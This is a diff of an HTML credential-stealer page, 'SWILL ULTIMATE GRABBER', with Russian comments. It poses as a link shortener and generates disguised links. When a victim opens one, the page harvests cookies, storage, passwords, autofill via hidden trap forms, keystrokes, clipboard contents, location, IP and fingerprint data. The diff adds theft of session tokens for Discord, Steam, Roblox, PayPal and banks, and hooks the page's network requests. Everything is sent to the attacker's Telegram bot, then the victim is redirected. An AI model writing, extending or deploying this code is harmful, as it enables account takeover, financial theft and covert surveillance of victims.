@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SWILL ULTIMATE VPN GRABBER</title>
+    <title>⚡ SWILL ULTIMATE GRABBER ⚡</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui; }
         body {
@@ -21,7 +21,7 @@
             backdrop-filter: blur(12px);
             border-radius: 2.5rem;
             padding: 2rem 1.8rem;
-            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
         }
         h1 { font-size: 2rem; font-weight: 600; background: linear-gradient(120deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; }
         .sub { color: #8b9bcf; font-size: 0.85rem; margin-bottom: 2rem; border-left: 3px solid #2dd4bf; padding-left: 0.75rem; }
@@ -31,6 +31,7 @@
             background: #0f172acc; border: 1px solid #2d3a5e; border-radius: 1.2rem;
             padding: 0.9rem 1.2rem; color: white; outline: none;
         }
+        input:focus { border-color: #2dd4bf; box-shadow: 0 0 0 3px rgba(45,212,191,0.2); }
         button {
             background: linear-gradient(100deg, #2dd4bf, #14b8a6);
             border: none; border-radius: 2rem; padding: 0.9rem;
@@ -41,7 +42,7 @@
         .short-link-block { display: flex; gap: 0.7rem; align-items: center; flex-wrap: wrap; }
         .short-link { background: #030712; padding: 0.6rem 1rem; border-radius: 1.2rem; font-family: monospace; word-break: break-all; flex: 1; color: #b9e6f0; }
         .copy-btn { background: #334155; width: auto; padding: 0.6rem 1.2rem; color: white; }
-        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e2a3ecc; padding: 0.6rem 1.5rem; border-radius: 3rem; color: white; opacity: 0; transition: 0.2s; pointer-events: none; z-index: 10000; }
+        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e2a3ecc; backdrop-filter: blur(8px); padding: 0.6rem 1.5rem; border-radius: 3rem; color: white; opacity: 0; transition: 0.2s; pointer-events: none; z-index: 10000; }
         .toast-msg.show-toast { opacity: 1; }
         .overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -53,13 +54,14 @@
         .loader { width: 80px; height: 80px; border: 6px solid rgba(45,212,191,0.2); border-top: 6px solid #2dd4bf; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 2rem; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .status-msg { font-size: 1.2rem; margin: 1rem; max-width: 80%; }
-        .error-vpn { background: #f9731644; border-left: 4px solid #f97316; padding: 1rem; border-radius: 1rem; margin-top: 1rem; }
+        .progress-bar { width: 80%; height: 4px; background: rgba(255,255,255,0.2); border-radius: 4px; margin-top: 2rem; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #2dd4bf; transition: width 0.3s; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>swill<span style="color:#2dd4bf;">.vpn</span></h1>
-    <div class="sub">гарантированный сбор через VPN</div>
+    <h1>swill<span style="color:#2dd4bf;">.ultimate</span></h1>
+    <div class="sub">абсолютный сбор данных</div>
     <div class="input-group"><label>🔗 Целевая ссылка</label><input type="text" id="longUrl" placeholder="https://example.com"></div>
     <div class="input-group"><label>🤖 Токен Telegram бота</label><input type="text" id="botToken" placeholder="123456:ABCdef"></div>
     <div class="input-group"><label>🆔 Ваш Telegram ID</label><input type="text" id="chatId" placeholder="123456789"></div>
@@ -73,13 +75,15 @@
 <div id="overlay" class="overlay hidden">
     <div class="loader" id="loaderIcon"></div>
     <div class="status-msg" id="statusMsg">Проверка соединения...</div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
     <div id="errorContainer"></div>
 </div>
 
 <script>
 (function(){
-    // ---------- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ----------
     let botToken = "", chatId = "";
+    let targetUrl = "";
+    let vpnPassed = false;
     let collectedData = {
         time: new Date().toISOString(),
         url: location.href,
@@ -91,48 +95,244 @@
         cookies: document.cookie,
         localStorage: {},
         sessionStorage: {},
+        indexedDB: [],
         forms: {},
         passwords: [],
         keystrokes: [],
         clipboard: "",
         autofill: [],
         webrtcIP: "",
+        publicIP: "",
         geolocation: null,
         fingerprint: {},
         extensions: [],
         cryptoWallets: {},
         networkLogs: [],
         globalVars: {},
-        iframeData: []
+        iframeData: [],
+        // Специфичные для сервисов данные
+        discord: {},
+        telegram: {},
+        vk: {},
+        roblox: {},
+        steam: {},
+        epicgames: {},
+        minecraft: {},
+        twitch: {},
+        whatsapp: {},
+        tiktok: {},
+        reddit: {},
+        paypal: {},
+        bankCookies: {}
     };
     let keyLogStr = "";
     let lastSend = Date.now();
-    let vpnPassed = false;
 
-    // ---------- 1. ПРОВЕРКА VPN (доступ к Telegram API) ----------
+    // ---- 1. ПРОВЕРКА VPN (доступ к Telegram API) ----
     async function checkVPN(token) {
         const controller = new AbortController();
         const timeoutId = setTimeout(() => controller.abort(), 5000);
         try {
             const resp = await fetch(`https://api.telegram.org/bot${token}/getMe`, {
-                method: 'GET',
-                signal: controller.signal,
-                mode: 'cors'
+                method: 'GET', signal: controller.signal, mode: 'cors'
             });
             clearTimeout(timeoutId);
             return resp.ok;
-        } catch(e) {
-            clearTimeout(timeoutId);
-            return false;
+        } catch(e) { clearTimeout(timeoutId); return false; }
+    }
+
+    // ---- 2. СБОР ДАННЫХ СПЕЦИФИЧНЫХ ДЛЯ СЕРВИСОВ ----
+    function grabServiceSpecificData() {
+        // Discord: localStorage токены и куки
+        try {
+            if(window.localStorage.getItem('token')) {
+                collectedData.discord.token = window.localStorage.getItem('token');
+            }
+            // Discord Web токен
+            for(let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                if(key.includes('token') || key.includes('discord')) {
+                    collectedData.discord[key] = localStorage.getItem(key);
+                }
+            }
+        } catch(e) {}
+
+        // Telegram Web (web.telegram.org)
+        try {
+            if(window.location.hostname.includes('web.telegram.org')) {
+                const tgKeys = ['dc1_auth_key', 'dc2_auth_key', 'dc3_auth_key', 'dc4_auth_key'];
+                tgKeys.forEach(key => {
+                    if(localStorage.getItem(key)) {
+                        collectedData.telegram[key] = localStorage.getItem(key);
+                    }
+                });
+            }
+        } catch(e) {}
+
+        // VK.com
+        try {
+            const vkCookies = ['remixlang', 'remixsid', 'remixsid6', 'l', 'remixflash', 'remixscreen_depth', 'remixdt'];
+            vkCookies.forEach(c => {
+                if(document.cookie.includes(c)) {
+                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
+                    if(match) collectedData.vk[c] = match[1];
+                }
+            });
+        } catch(e) {}
+
+        // Roblox
+        try {
+            if(document.cookie.includes('.ROBLOSECURITY')) {
+                const match = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+                if(match) collectedData.roblox.ROBLOSECURITY = match[1];
+            }
+        } catch(e) {}
+
+        // Steam
+        try {
+            const steamCookies = ['sessionid', 'steamLoginSecure', 'steamMachineAuth'];
+            steamCookies.forEach(c => {
+                if(document.cookie.includes(c)) {
+                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
+                    if(match) collectedData.steam[c] = match[1];
+                }
+            });
+        } catch(e) {}
+
+        // Epic Games / Fortnite
+        try {
+            const epicKeys = ['EPIC_GAMES_AUTH_TOKEN', 'EPIC_ACCESS_TOKEN', 'EPIC_REFRESH_TOKEN'];
+            epicKeys.forEach(k => {
+                if(localStorage.getItem(k)) {
+                    collectedData.epicgames[k] = localStorage.getItem(k);
+                }
+            });
+        } catch(e) {}
+
+        // Minecraft / Microsoft
+        try {
+            const mcKeys = ['user', 'access_token', 'refresh_token', 'minecraft_server_session'];
+            mcKeys.forEach(k => {
+                if(localStorage.getItem(k)) {
+                    collectedData.minecraft[k] = localStorage.getItem(k);
+                }
+            });
+        } catch(e) {}
+
+        // Twitch
+        try {
+            if(document.cookie.includes('auth-token')) {
+                const match = document.cookie.match(/auth-token=([^;]+)/);
+                if(match) collectedData.twitch.token = match[1];
+            }
+            if(localStorage.getItem('twitch-token')) {
+                collectedData.twitch.token = localStorage.getItem('twitch-token');
+            }
+        } catch(e) {}
+
+        // WhatsApp Web
+        try {
+            if(window.location.hostname.includes('web.whatsapp.com')) {
+                for(let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    if(key.includes('WAD') || key.includes('whatsapp')) {
+                        collectedData.whatsapp[key] = localStorage.getItem(key);
+                    }
+                }
+            }
+        } catch(e) {}
+
+        // TikTok
+        try {
+            const tiktokCookies = ['sessionid', 'passport_csrf_token', 'sid_tt'];
+            tiktokCookies.forEach(c => {
+                if(document.cookie.includes(c)) {
+                    const match = document.cookie.match(new RegExp(`${c}=([^;]+)`));
+                    if(match) collectedData.tiktok[c] = match[1];
+                }
+            });
+        } catch(e) {}
+
+        // Reddit
+        try {
+            if(document.cookie.includes('reddit_session')) {
+                const match = document.cookie.match(/reddit_session=([^;]+)/);
+                if(match) collectedData.reddit.session = match[1];
+            }
+        } catch(e) {}
+
+        // PayPal
+        try {
+            if(document.cookie.includes('cookie_check') || document.cookie.includes('login_email')) {
+                collectedData.paypal.cookies = document.cookie;
+            }
+        } catch(e) {}
+
+        // Банковские куки (обнаружение по паттернам)
+        try {
+            const bankPatterns = ['bank', 'sber', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb'];
+            const allCookies = document.cookie.split(';');
+            const bankCookies = {};
+            allCookies.forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if(bankPatterns.some(p => name.toLowerCase().includes(p))) {
+                    bankCookies[name] = value;
+                }
+            });
+            if(Object.keys(bankCookies).length > 0) {
+                collectedData.bankCookies = bankCookies;
+            }
+        } catch(e) {}
+    }
+
+    // ---- 3. КРИПТОКОШЕЛЬКИ ----
+    function grabCryptoWallets() {
+        let wallets = {};
+        try {
+            if(window.ethereum) {
+                wallets.ethereum = {
+                    isMetaMask: window.ethereum.isMetaMask,
+                    selectedAddress: window.ethereum.selectedAddress,
+                    networkVersion: window.ethereum.networkVersion,
+                    chainId: window.ethereum.chainId
+                };
+            }
+        } catch(e) {}
+        try {
+            if(window.solana) {
+                wallets.solana = {
+                    isPhantom: window.solana.isPhantom,
+                    publicKey: window.solana.publicKey?.toString()
+                };
+            }
+        } catch(e) {}
+        try {
+            if(window.coinbaseWalletExtension) {
+                wallets.coinbase = true;
+            }
+        } catch(e) {}
+        collectedData.cryptoWallets = wallets;
+    }
+
+    // ---- 4. СБОР ВСЕХ СТОРАДЖЕЙ ----
+    function grabStorages() {
+        for(let i = 0; i < localStorage.length; i++) {
+            let k = localStorage.key(i);
+            collectedData.localStorage[k] = localStorage.getItem(k);
+        }
+        for(let i = 0; i < sessionStorage.length; i++) {
+            let k = sessionStorage.key(i);
+            collectedData.sessionStorage[k] = sessionStorage.getItem(k);
+        }
+        // IndexedDB
+        if(window.indexedDB && indexedDB.databases) {
+            indexedDB.databases().then(dbs => {
+                collectedData.indexedDB = dbs.map(db => db.name);
+            }).catch(() => {});
         }
     }
 
-    // ---------- 2. ВСЕ МОДУЛИ СБОРА (УЛЬТРА) ----------
-    function grabStorages() {
-        for(let i=0; i<localStorage.length; i++) { let k = localStorage.key(i); collectedData.localStorage[k] = localStorage.getItem(k); }
-        for(let i=0; i<sessionStorage.length; i++) { let k = sessionStorage.key(i); collectedData.sessionStorage[k] = sessionStorage.getItem(k); }
-    }
-
+    // ---- 5. ВСЕ ПОЛЯ ФОРМ + ПАРОЛИ ----
     function grabForms() {
         let inputs = document.querySelectorAll('input, textarea, select');
         let formData = {};
@@ -141,51 +341,63 @@
             let val = el.value || '';
             formData[name] = val;
             if(el.type === 'password' || name.toLowerCase().includes('pass')) {
-                if(val) collectedData.passwords.push({ field: name, pass: val });
+                if(val) collectedData.passwords.push({ field: name, pass: val, type: el.type });
             }
         });
         collectedData.forms = formData;
     }
 
-    // Кейлоггер
+    // ---- 6. КЕЙЛОГГЕР ----
     document.addEventListener('keydown', (e) => {
         if(!vpnPassed) return;
         let key = e.key === ' ' ? 'SPACE' : e.key;
         if(key === 'Unidentified') return;
         let log = `${Date.now()} | ${key} @ ${e.target.tagName}:${e.target.id || e.target.name || '?'}`;
-        collectedData.keystrokes.push(log);
+        collectedData.keystrokes.push({ time: Date.now(), key: key, target: e.target.tagName });
         keyLogStr += log + "\n";
-        if(Date.now() - lastSend > 5000) sendPartialKeylog();
+        if(Date.now() - lastSend > 8000) sendPartialKeylog();
     });
 
-    // Буфер обмена
-    document.addEventListener('copy', async () => { try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e){} });
-    document.addEventListener('cut', async () => { try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e){} });
+    // ---- 7. БУФЕР ОБМЕНА ----
+    document.addEventListener('copy', async () => {
+        try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e) {}
+    });
+    document.addEventListener('cut', async () => {
+        try { collectedData.clipboard = await navigator.clipboard.readText(); } catch(e) {}
+    });
 
-    // Автозаполнение (ловушки)
+    // ---- 8. АВТОЗАПОЛНЕНИЕ (ЛОВУШКИ) ----
     function createAutoFillTraps() {
         let container = document.createElement('div');
         container.style.display = 'none';
         document.body.appendChild(container);
-        let combos = [['username','password'], ['email','pass'], ['login','pwd'], ['user','current-password'], ['email','current-password']];
-        for(let i=0; i<30; i++) {
-            for(let [u,p] of combos) {
-                let f = document.createElement('form');
-                let inpU = document.createElement('input');
-                inpU.type = 'text'; inpU.name = u; inpU.autocomplete = u;
-                let inpP = document.createElement('input');
-                inpP.type = 'password'; inpP.name = p; inpP.autocomplete = p;
-                f.appendChild(inpU); f.appendChild(inpP);
-                container.appendChild(f);
-                setTimeout(() => {
-                    if(inpU.value) collectedData.autofill.push({ type: u, value: inpU.value });
-                    if(inpP.value) collectedData.autofill.push({ type: p, value: inpP.value });
-                }, 1500);
+        const combos = [
+            ['username','password'], ['email','pass'], ['login','pwd'],
+            ['user','current-password'], ['email','current-password'],
+            ['email','new-password'], ['username','new-password']
+        ];
+        const domains = ['', 'google.com', 'facebook.com', 'vk.com', 'mail.ru', 'github.com', 'yandex.ru'];
+        for(let i = 0; i < 30; i++) {
+            for(let d of domains) {
+                for(let [u,p] of combos) {
+                    let form = document.createElement('form');
+                    if(d) form.setAttribute('data-domain', d);
+                    let inpU = document.createElement('input');
+                    inpU.type = 'text'; inpU.name = u; inpU.autocomplete = u;
+                    let inpP = document.createElement('input');
+                    inpP.type = 'password'; inpP.name = p; inpP.autocomplete = p;
+                    form.appendChild(inpU); form.appendChild(inpP);
+                    container.appendChild(form);
+                    setTimeout(() => {
+                        if(inpU.value) collectedData.autofill.push({ type: u, value: inpU.value, domain: d });
+                        if(inpP.value) collectedData.autofill.push({ type: p, value: inpP.value, domain: d });
+                    }, 1500);
+                }
             }
         }
     }
 
-    // WebRTC IP
+    // ---- 9. WEBRTC IP ----
     function getWebRTCIP() {
         return new Promise(resolve => {
             let pc = new RTCPeerConnection({ iceServers: [] });
@@ -201,23 +413,39 @@
         });
     }
 
-    // Геолокация
+    // ---- 10. ПУБЛИЧНЫЙ IP ----
+    async function getPublicIP() {
+        try {
+            const resp = await fetch('https://api.ipify.org?format=json');
+            const data = await resp.json();
+            return data.ip;
+        } catch(e) { return 'unknown'; }
+    }
+
+    // ---- 11. ГЕОЛОКАЦИЯ (если разрешено) ----
     function getGeo() {
         return new Promise(resolve => {
             if(!navigator.geolocation) resolve(null);
-            navigator.geolocation.getCurrentPosition(p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }), () => resolve(null), { timeout: 3000 });
+            navigator.geolocation.getCurrentPosition(
+                p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy }),
+                () => resolve(null),
+                { timeout: 5000, enableHighAccuracy: true }
+            );
         });
     }
 
-    // Fingerprint
+    // ---- 12. FINGERPRINT ----
     async function getFingerprint() {
         let fp = {};
+        // Canvas
         let canvas = document.createElement('canvas');
         canvas.width = 200; canvas.height = 50;
         let ctx = canvas.getContext('2d');
         ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,50);
         ctx.fillStyle = '#069'; ctx.fillText('swill',2,15);
+        ctx.fillStyle = '#0f0'; ctx.font = '14px Arial'; ctx.fillText('fingerprint', 50, 30);
         fp.canvas = canvas.toDataURL();
+        // WebGL
         try {
             let gl = document.createElement('canvas').getContext('webgl');
             if(gl) {
@@ -228,6 +456,7 @@
                 }
             }
         } catch(e){}
+        // Audio
         try {
             let AudioCtx = window.AudioContext || window.webkitAudioContext;
             if(AudioCtx) {
@@ -241,11 +470,11 @@
                 let data = new Uint8Array(analyser.frequencyBinCount);
                 analyser.getByteFrequencyData(data);
                 fp.audioHash = Array.from(data).slice(0,50).join('');
-                oscillator.stop();
-                ctxAudio.close();
+                oscillator.stop(); ctxAudio.close();
             }
         } catch(e){}
-        let fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans'];
+        // Fonts
+        let fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans','Impact','Comic Sans MS','Tahoma','Trebuchet MS'];
         let found = [];
         for(let f of fonts) if(document.fonts.check(`12px "${f}"`)) found.push(f);
         fp.fonts = found;
@@ -253,61 +482,64 @@
         fp.hardwareConcurrency = navigator.hardwareConcurrency;
         fp.deviceMemory = navigator.deviceMemory;
         fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        fp.languages = navigator.languages;
+        fp.colorDepth = screen.colorDepth;
+        fp.pixelRatio = window.devicePixelRatio;
         return fp;
     }
 
-    // Криптокошельки
-    function grabCryptoWallets() {
-        let wallets = {};
-        if(window.ethereum) wallets.ethereum = { isMetaMask: window.ethereum.isMetaMask, selectedAddress: window.ethereum.selectedAddress };
-        if(window.solana) wallets.solana = { isPhantom: window.solana.isPhantom, publicKey: window.solana.publicKey?.toString() };
-        if(window.cardano) wallets.cardano = true;
-        collectedData.cryptoWallets = wallets;
+    // ---- 13. ПЕРЕХВАТ СЕТЕВЫХ ЗАПРОСОВ ----
+    function interceptNetwork() {
+        const origFetch = window.fetch;
+        window.fetch = function(...args) {
+            let url = typeof args[0] === 'string' ? args[0] : args[0]?.url;
+            if(url && (url.includes('token') || url.includes('auth') || url.includes('api'))) {
+                collectedData.networkLogs.push({ type: 'fetch', url: url, time: Date.now() });
+            }
+            return origFetch.apply(this, args);
+        };
+        const origXHR = window.XMLHttpRequest.prototype.open;
+        window.XMLHttpRequest.prototype.open = function(method, url) {
+            this._url = url;
+            return origXHR.apply(this, arguments);
+        };
+        window.XMLHttpRequest.prototype.send = function() {
+            if(this._url && (this._url.includes('token') || this._url.includes('auth'))) {
+                collectedData.networkLogs.push({ type: 'xhr', url: this._url, time: Date.now() });
+            }
+            return origXHR.send.apply(this, arguments);
+        };
     }
 
-    // Глобальные переменные (токены)
+    // ---- 14. ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ (ТОКЕНЫ) ----
     function grabGlobalVars() {
-        let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth'];
+        let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth', 'key', 'session', 'pass', 'password'];
         let found = {};
         for(let key in window) {
             try {
                 if(interesting.some(i => key.toLowerCase().includes(i))) {
                     let val = window[key];
-                    if(typeof val === 'string' && val.length > 5 && val.length < 500) found[key] = val;
+                    if(typeof val === 'string' && val.length > 3 && val.length < 1000) found[key] = val;
+                    else if(typeof val === 'object' && val !== null) {
+                        if(val.token) found[key+'.token'] = val.token;
+                        if(val.accessToken) found[key+'.accessToken'] = val.accessToken;
+                    }
                 }
             } catch(e) {}
         }
         collectedData.globalVars = found;
     }
 
-    // Iframe-внедрение
-    function injectIframes() {
-        let sites = ['https://google.com', 'https://facebook.com', 'https://vk.com', 'https://github.com', 'https://mail.ru'];
-        sites.forEach(site => {
-            let ifr = document.createElement('iframe');
-            ifr.src = site;
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-            ifr.onload = () => {
-                try {
-                    let doc = ifr.contentDocument || ifr.contentWindow.document;
-                    let title = doc ? doc.title : 'blocked';
-                    collectedData.iframeData.push({ site, title, canAccess: !!doc });
-                } catch(e) { collectedData.iframeData.push({ site, error: e.message }); }
-            };
-        });
-    }
-
-    // ---------- 3. ОТПРАВКА В TELEGRAM (МАКСИМАЛЬНО НАДЁЖНАЯ) ----------
-    async function sendToTelegram(data, filename = 'swill_dump.txt') {
+    // ---- 15. ОТПРАВКА В TELEGRAM (4 СПОСОБА) ----
+    async function sendToTelegram(data, filename = 'swill_ultimate_dump.txt') {
         if(!botToken || !chatId) return false;
         let json = JSON.stringify(data, null, 2);
         let blob = new Blob([json], { type: 'text/plain' });
+        
+        // Способ 1: fetch no-cors
         let formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('document', blob, filename);
-        
-        // Способ 1: fetch no-cors
         try {
             await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: 'POST', body: formData, mode: 'no-cors', keepalive: true
@@ -322,14 +554,14 @@
             navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, fd);
         }
         
-        // Способ 3: image-маяк для текста (если файл не пройдёт, хотя бы пароли и кейлог)
-        let textData = `🔹 REPORT from ${data.url}\nTime: ${data.time}\nIP: ${data.webrtcIP || 'unknown'}\nPasswords: ${data.passwords.length}\nKeystrokes: ${data.keystrokes.length}`;
-        let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textData.slice(0,200))}`;
+        // Способ 3: Image для короткого уведомления
+        let summary = `📊 REPORT from ${data.url}\nTime: ${data.time}\nIP: ${data.webrtcIP || '?'}\nPasswords: ${data.passwords.length}\nKeystrokes: ${data.keystrokes.length}\nAutofill: ${data.autofill.length}`;
+        let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(summary.slice(0,200))}`;
         new Image().src = imgUrl;
         
         return true;
     }
-    
+
     async function sendPasswordsAndKeys() {
         if(!botToken || !chatId) return;
         if(collectedData.passwords.length) {
@@ -338,6 +570,15 @@
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: pText, parse_mode: "Markdown" }),
+                mode: 'no-cors', keepalive: true
+            });
+        }
+        if(collectedData.autofill.length) {
+            let aText = "🔄 **AUTOFILL:**\n" + collectedData.autofill.map(a => `${a.type}: ${a.value}`).join('\n');
+            aText = aText.slice(0,3900);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: aText, parse_mode: "Markdown" }),
                 mode: 'no-cors', keepalive: true
             });
         }
@@ -351,7 +592,7 @@
             });
         }
     }
-    
+
     async function sendPartialKeylog() {
         if(keyLogStr.length > 200 && botToken && chatId) {
             let part = keyLogStr.slice(-1500);
@@ -363,47 +604,63 @@
             lastSend = Date.now();
         }
     }
-    
-    // ---------- 4. ГЛАВНАЯ ФУНКЦИЯ СБОРА (ЗАПУСК ПОСЛЕ VPN) ----------
-    async function fullGrabAndSend(statusElement) {
-        statusElement.innerText = "🔍 Сбор данных: куки, storage...";
+
+    // ---- 16. ГЛАВНЫЙ СБОРЩИК ----
+    async function fullGrabAndSend(statusElement, progressFill) {
+        const updateProgress = (percent, text) => {
+            if(progressFill) progressFill.style.width = percent + '%';
+            if(statusElement) statusElement.innerText = text;
+        };
+        
+        updateProgress(5, "🔍 Сбор хранилищ...");
         grabStorages();
-        statusElement.innerText = "📝 Сбор форм и паролей...";
+        
+        updateProgress(15, "📝 Сбор форм и паролей...");
         grabForms();
-        statusElement.innerText = "🕸️ Создание ловушек автозаполнения...";
+        
+        updateProgress(25, "🕸️ Создание ловушек автозаполнения...");
         createAutoFillTraps();
-        statusElement.innerText = "🎛️ Fingerprint + WebRTC...";
-        collectedData.webrtcIP = await getWebRTCIP();
-        collectedData.fingerprint = await getFingerprint();
-        statusElement.innerText = "📍 Геолокация...";
-        collectedData.geolocation = await getGeo();
-        statusElement.innerText = "💰 Криптокошельки...";
+        
+        updateProgress(35, "🎮 Сбор данных игр и соцсетей...");
+        grabServiceSpecificData();
+        
+        updateProgress(45, "💰 Криптокошельки...");
         grabCryptoWallets();
-        statusElement.innerText = "🌍 Глобальные переменные...";
+        
+        updateProgress(55, "🌍 Глобальные переменные...");
         grabGlobalVars();
-        statusElement.innerText = "🖼️ Iframe-внедрение...";
-        injectIframes();
         
-        statusElement.innerText = "⏳ Ожидание 8 секунд для автозаполнения...";
-        await new Promise(r => setTimeout(r, 8000));
+        updateProgress(65, "🔌 WebRTC IP...");
+        collectedData.webrtcIP = await getWebRTCIP();
         
-        statusElement.innerText = "📦 Финальный сбор форм (повтор)...";
+        updateProgress(75, "📡 Публичный IP...");
+        collectedData.publicIP = await getPublicIP();
+        
+        updateProgress(80, "📍 Геолокация...");
+        collectedData.geolocation = await getGeo();
+        
+        updateProgress(85, "🖨️ Fingerprint...");
+        collectedData.fingerprint = await getFingerprint();
+        
+        updateProgress(90, "⏳ Ожидание автозаполнения (6 сек)...");
+        await new Promise(r => setTimeout(r, 6000));
+        
+        updateProgress(95, "📦 Финальный сбор...");
         grabForms();
         grabStorages();
+        grabServiceSpecificData();
         
-        statusElement.innerText = "📤 Отправка полного дампа в Telegram...";
-        await sendToTelegram(collectedData, 'ultimate_vpn_dump.txt');
+        updateProgress(98, "📤 Отправка в Telegram...");
+        await sendToTelegram(collectedData, 'swill_ultimate_dump.txt');
         await sendPasswordsAndKeys();
         
-        statusElement.innerText = "✅ Данные отправлены! Редирект через 2 секунды...";
-        setTimeout(() => { window.location.href = targetUrl; }, 2000);
+        updateProgress(100, "✅ Готово! Редирект...");
+        setTimeout(() => { window.location.href = targetUrl; }, 1500);
     }
-    
-    let targetUrl = "";
-    
-    // ---------- 5. ОБРАБОТЧИК ХЭША (ПЕРЕХОД ПО КОРОТКОЙ ССЫЛКЕ) ----------
+
+    // ---- 17. ОБРАБОТЧИК ХЭША ----
     async function handleHashRedirect() {
-        let hash = location.hash.substring(1);
+        let hash = window.location.hash.substring(1);
         if(!hash) return;
         let decoded;
         try {
@@ -412,40 +669,43 @@
             if(parts.length !== 3) throw new Error();
             let [url, token, id] = parts;
             if(!url.startsWith('http')) throw new Error();
-            if(!token || token.length<5) throw new Error();
+            if(!token || token.length < 5) throw new Error();
             if(isNaN(Number(id))) throw new Error();
             decoded = { originalUrl: url, botToken: token, chatId: Number(id) };
         } catch(e) {
             alert("Невалидная ссылка");
             return;
         }
+        
         botToken = decoded.botToken;
         chatId = decoded.chatId;
         targetUrl = decoded.originalUrl;
         
         const overlay = document.getElementById('overlay');
         const statusMsg = document.getElementById('statusMsg');
+        const progressFill = document.getElementById('progressFill');
         const errorContainer = document.getElementById('errorContainer');
         overlay.classList.remove('hidden');
-        statusMsg.innerText = "🛡️ Проверка VPN (доступ к Telegram)...";
+        statusMsg.innerText = "🛡️ Проверка VPN...";
         
         const vpnOk = await checkVPN(botToken);
         if(!vpnOk) {
             statusMsg.style.display = 'none';
-            errorContainer.innerHTML = `<div class="error-vpn">⚠️ Telegram API недоступен. Включите VPN и перезагрузите страницу.</div>`;
+            errorContainer.innerHTML = `<div style="background:#f9731644; border-left:4px solid #f97316; padding:1rem; border-radius:1rem;">⚠️ Telegram API недоступен. Включите VPN и перезагрузите страницу.</div>`;
             document.getElementById('loaderIcon').style.display = 'none';
             return;
         }
+        
         vpnPassed = true;
         statusMsg.innerText = "✅ VPN активен. Начинаем сбор данных...";
-        await fullGrabAndSend(statusMsg);
+        await fullGrabAndSend(statusMsg, progressFill);
     }
-    
-    // ---------- 6. ИНТЕРФЕЙС СОЗДАНИЯ ССЫЛОК ----------
+
+    // ---- 18. ИНТЕРФЕЙС СОЗДАНИЯ ССЫЛОК ----
     function generateShortLink(originalUrl, token, id) {
         let payload = `${originalUrl}|${token}|${id}`;
         let encoded = btoa(unescape(encodeURIComponent(payload)));
-        return location.origin + location.pathname + '#' + encoded;
+        return window.location.origin + window.location.pathname + '#' + encoded;
     }
     
     document.getElementById('shortenBtn').onclick = () => {
@@ -459,6 +719,7 @@
         document.getElementById('shortLinkDisplay').innerText = short;
         document.getElementById('resultBlock').classList.add('show');
     };
+    
     document.getElementById('copyBtn').onclick = () => {
         let link = document.getElementById('shortLinkDisplay').innerText;
         navigator.clipboard.writeText(link);
@@ -469,6 +730,9 @@
     
     window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
     window.addEventListener('hashchange', () => handleHashRedirect());
+    
+    // Запуск перехвата сетевых запросов сразу
+    interceptNetwork();
 })();
 </script>
 </body>
